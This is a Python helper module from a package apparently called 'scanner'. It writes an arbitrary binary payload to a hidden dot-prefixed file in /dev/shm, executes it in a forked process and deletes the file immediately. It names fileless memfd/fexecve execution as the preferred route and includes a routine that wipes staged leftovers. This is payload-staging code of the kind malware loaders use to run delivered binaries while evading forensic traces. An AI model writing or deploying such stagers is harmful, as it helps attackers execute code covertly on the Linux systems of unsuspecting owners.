# -*- coding: utf-8 -*-
"""Helper utilities — /dev/shm fallback staging (Linux only)."""

import os
import sys
import tempfile
from pathlib import Path

from scanner.ui import print_success, print_error


def stage_and_run_linux(payload: bytes) -> bool:
    """Linux-only fallback when memfd path is unavailable.
    Prefer scanner.execute._exec_elf (which uses memfd + fexecve)."""
    if sys.platform != "linux":
        print_error("Linux-only execution path.")
        return False

    shm = Path("/dev/shm")
    target_dir = shm if shm.is_dir() and os.access(shm, os.W_OK) else Path(tempfile.gettempdir())

    try:
        fd, path = tempfile.mkstemp(prefix=".tmp_", dir=str(target_dir))
        os.close(fd)
        with open(path, "wb") as f:
            f.write(payload)
        os.chmod(path, 0o700)

        pid = os.fork()
        if pid == 0:
            try:
                os.execv(path, [path])
            except Exception:
                os._exit(1)
        else:
            try:
                os.unlink(path)
            except Exception:
                pass
            return True
    except Exception as e:
        print_error(f"Stage/run error: {e}")
        return False


def cleanup_leftovers():
    try:
        for p in Path("/dev/shm").glob(".tmp_*"):
            try:
                p.unlink()
            except Exception:
                pass
        print_success("Cleanup complete.")
    except Exception as e:
        print_error(f"Cleanup error: {e}")
